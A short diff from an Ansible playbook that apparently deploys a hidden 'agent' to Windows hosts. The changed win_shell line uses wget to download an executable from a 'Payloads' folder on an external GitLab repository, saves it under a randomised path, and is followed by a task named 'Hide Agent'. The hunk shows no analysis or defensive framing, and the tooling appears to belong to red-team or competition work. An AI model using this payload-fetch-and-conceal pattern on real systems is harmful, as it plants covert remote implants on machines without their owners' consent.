@@ -25,7 +25,7 @@
   when: ansible_os_family == "Windows"
 
 - name: Windows Deploy | Download agent
-  win_shell: wget -o "{{ windows_random_path }}{{ windows_random_file_name}}" https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads
+  win_shell: wget -o "{{ windows_random_path }}{{ windows_random_file_name}}" https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/httpsBinary/windows.exe?ref_type=heads
   when: ansible_os_family == "Windows"
 
 - name: Windows Deploy | Hide Agent
